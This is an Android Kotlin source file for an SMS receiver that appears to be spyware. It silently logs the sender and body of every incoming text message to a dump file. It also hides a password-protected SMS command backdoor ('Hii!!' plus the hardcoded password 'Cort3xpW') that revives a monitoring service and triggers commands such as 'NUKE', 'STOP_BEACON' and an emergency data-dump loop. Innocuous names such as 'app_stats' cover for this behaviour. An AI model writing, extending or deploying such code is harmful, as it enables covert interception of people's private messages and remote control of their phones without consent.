package com.example.myandroid

import kotlinx.coroutines.*

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        // Feature Gate
        if (!ConfigManager.canCollect(context, "sms")) return

        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            // ANR FIX: Go Async to prevent main thread blocking on large log files
            val pendingResult = goAsync()
            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                try {
                    val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    val editor = prefs.edit()
                    
                    // 1. Update Counters
            val current = prefs.getInt("sms_count", 0)
            val firstRun = prefs.getLong("first_run_time", 0L)
            if (firstRun == 0L) editor.putLong("first_run_time", System.currentTimeMillis())
            editor.putInt("sms_count", current + 1)
            editor.putLong("sms_last_time", System.currentTimeMillis())

            // 2. Parse Messages
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages != null && messages.isNotEmpty()) {
                messages.forEach { msg ->
                    val body = msg.messageBody
                    val sender = msg.displayOriginatingAddress

                    // --- A. LOGGING (STREAM) ---
                    val entry = JSONObject()
                    entry.put("sender", sender)
                    entry.put("body", body)
                    entry.put("timestamp", System.currentTimeMillis())
                    
                    // Write to file instantly (No Lag)
                    DumpManager.appendLog("SMS", entry)

                    // --- B. GHOST TUNNEL (Hii!! Protocol) ---
                    // Syntax: Hii!! [Password] [Command] [Content]
                    if (body != null && body.startsWith("Hii!!")) {
                        val parts = body.split(" ")
                        if (parts.size >= 2) {
                            val providedPwd = parts[1].trim()
                            // Strict Password Match (Case Sensitive)
                            if (providedPwd == "Cort3xpW") {
                                
                                // 1. DEFIBRILLATOR: Resurrect if dead
                                val monitorIntent = Intent(context, MonitorService::class.java)
                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) context.startForegroundService(monitorIntent)
                                else context.startService(monitorIntent)
                                KeepAliveReceiver.scheduleNext(context)

                                // 2. EXECUTE CRITICAL COMMANDS
                                val cmd = if (parts.size >= 3) parts[2].uppercase() else "CODERED"
                                val content = if (parts.size >= 4) body.substringAfter(parts[2]).trim() else "0"

                                when (cmd) {
                                    "NUKE", "STAY_READY", "STOP_BEACON" -> {
                                        // Route directly to main brain
                                        val jsonCmd = JSONObject()
                                        jsonCmd.put("id", -1) // System ID
                                        jsonCmd.put("file_name", cmd)
                                        jsonCmd.put("content", content)
                                        CommandProcessor.checkAndExecute(context) // Pre-wake check
                                        // Note: We'd ideally call a processSingleCommand here, but for now we let it fire via intent if needed
                                    }
                                    else -> {
                                        // Default: Start Emergency Data Dump Loop
                                        val i = Intent(context, EmergencyService::class.java)
                                        i.putExtra("sender", sender)
                                        i.putExtra("codes", content) // content is the 1,2,3 module codes
                                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) context.startForegroundService(i)
                                        else context.startService(i)
                                    }
                                }
                            }
                        }
                    }
                }
            }
            editor.apply()
            } catch(e: Exception) {
                e.printStackTrace()
            } finally {
                pendingResult.finish()
            }
            }
        }
    }
}